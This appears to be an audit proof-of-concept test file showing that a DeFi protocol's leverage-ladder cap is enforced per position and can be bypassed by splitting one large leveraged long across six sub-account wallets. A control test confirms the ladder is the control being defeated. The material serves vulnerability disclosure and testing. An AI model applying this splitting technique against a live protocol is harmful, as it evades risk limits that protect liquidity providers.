import { expect } from "chai";
import { ethers } from "ethers";

import { deployFixture } from "../../utils/fixture";
import { decimalToFloat, expandDecimals } from "../../utils/math";
import { handleDeposit } from "../../utils/deposit";
import { OrderType, handleOrder } from "../../utils/order";
import { getPositionKey } from "../../utils/position";
import { grantRole } from "../../utils/role";
import * as keys from "../../utils/keys";

const MAX_UINT = ethers.constants.MaxUint256;

/**
 * PoC — POS-001 : Leverage-ladder concentration cap is enforced PER-POSITION, not PER-ACCOUNT.
 *
 * The ladder (LeverageLadderUtils.getMaxLeverageForNotional, consumed by
 * PositionUtils.willPositionCollateralBeSufficient) caps max leverage by the *single position's*
 * post-trade notional. There is no per-account aggregate-notional cap anywhere in the increase flow.
 * So a trader the ladder intends to force into a low-leverage tier for a large position simply splits
 * it into several sub-positions (here: sub-account EOAs), each individually small enough to qualify for
 * the top (high-leverage) tier — defeating the concentration control at gas cost only.
 *
 * Ladder used:  [ <=$50k -> 50x ] [ <=$200k -> 25x ] [ >$200k -> 10x ]
 * Demonstration: ONE $300k position at 12.5x is BLOCKED (>$200k tier caps it at 10x), but the SAME
 * $300k of notional at 12.5x with the SAME total collateral, split into 6x $50k sub-positions, all OPEN.
 */
describe("PoC_LeverageLadderBypass (POS-001)", () => {
  let fixture;
  let user0, user1, user2, user3, user4, user5, user6;
  let reader, dataStore, roleStore, config, ethUsdMarket, usdc;
  const market = () => ethUsdMarket.marketToken;

  beforeEach(async () => {
    fixture = await deployFixture();
    ({ user0, user1, user2, user3, user4, user5, user6 } = fixture.accounts);
    ({ reader, dataStore, roleStore, config, ethUsdMarket, usdc } = fixture.contracts);

    // Deep liquidity so market capacity / reserves never bind.
    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(10_000, 18),
        shortTokenAmount: expandDecimals(50_000_000, 6),
      },
    });

    // Make the LADDER the only binding concentration control:
    await grantRole(roleStore, user0.address, "CONFIG_KEEPER");
    // explicit ladder: <=50k -> 50x, <=200k -> 25x, >200k -> 10x
    await config
      .connect(user0)
      .setLeverageLadder(
        market(),
        [expandDecimals(50_000, 30), expandDecimals(200_000, 30), MAX_UINT],
        [decimalToFloat(50), decimalToFloat(25), decimalToFloat(10)]
      );
    // generous market max_leverage (100x) so it never binds; neutralize the OI-based floor.
    await dataStore.setUint(keys.maxLeverageKey(market()), decimalToFloat(100));
    await dataStore.setUint(keys.minCollateralFactorForOpenInterestMultiplierKey(market(), true), 0);
    await dataStore.setUint(keys.minCollateralFactorForOpenInterestMultiplierKey(market(), false), 0);
  });

  async function openLong(account, sizeUsd: number, collateralUsdc: number, opts: any = {}) {
    await handleOrder(fixture, {
      create: {
        account,
        market: ethUsdMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(collateralUsdc, 6),
        sizeDeltaUsd: decimalToFloat(sizeUsd),
        acceptablePrice: expandDecimals(5001, 12),
        orderType: OrderType.MarketIncrease,
        isLong: true,
      },
      execute: opts.execute || {},
    });
  }

  function longSizeUsd(account): Promise<any> {
    const key = getPositionKey(account.address, market(), usdc.address, true);
    return reader.getPosition(dataStore.address, key).then((p) => p.numbers.sizeInUsd);
  }

  it("PER-POSITION ladder is bypassed by splitting one large position into sub-account positions", async () => {
    // ---- 1) The intended control: a single $300k position at 12.5x is BLOCKED ----
    // $300k notional -> >$200k tier -> cap 10x -> min collateral $30k. We supply $24k (12.5x) -> reject.
    await openLong(user0, 300_000, 24_000, {
      execute: { expectedCancellationReason: "InsufficientCollateralUsd" },
    });
    expect(await longSizeUsd(user0)).to.eq(0, "single $300k @ 12.5x must be blocked by the ladder");

    // ---- 2) The bypass: 6 sub-account positions of $50k each at the SAME 12.5x all OPEN ----
    // $50k notional -> <=$50k tier -> cap 50x -> min collateral $1k. We supply $4k (12.5x) -> allowed.
    const subs = [user1, user2, user3, user4, user5, user6];
    for (const u of subs) {
      await openLong(u, 50_000, 4_000);
    }

    let aggregateSize = ethers.BigNumber.from(0);
    let aggregateCollateral = ethers.BigNumber.from(0);
    for (const u of subs) {
      const sz = await longSizeUsd(u);
      expect(sz).to.eq(decimalToFloat(50_000), "each $50k sub-position opens at 12.5x via the top tier");
      aggregateSize = aggregateSize.add(sz);
      aggregateCollateral = aggregateCollateral.add(expandDecimals(4_000, 6));
    }

    // ---- 3) Same aggregate notional + same total collateral as the blocked single position ----
    expect(aggregateSize).to.eq(decimalToFloat(300_000), "attacker controls $300k notional across wallets");
    // 6 x $4k = $24k total collateral == the blocked single position's collateral, i.e. 12.5x aggregate.
    expect(aggregateCollateral).to.eq(expandDecimals(24_000, 6), "with the SAME $24k total collateral (12.5x)");

    console.log("BLOCKED single position : $300,000 @ 12.5x  -> InsufficientCollateralUsd");
    console.log("BYPASS  6x sub-positions: $50,000 @ 12.5x each = $300,000 @ 12.5x, $24k collateral -> ALL OPEN");
  });

  it("control: WITHOUT the ladder the same single $300k @ 12.5x opens — proving the ladder is the bypassed control", async () => {
    // Clear the ladder for the market (tier count -> 0 disables it).
    await config.connect(user0).setLeverageLadder(market(), [MAX_UINT], [decimalToFloat(100)]);
    await openLong(user0, 300_000, 24_000); // now only max_leverage(100x) governs -> opens fine
    expect(await longSizeUsd(user0)).to.eq(decimalToFloat(300_000), "single $300k @ 12.5x opens when no <10x tier applies");
  });
});
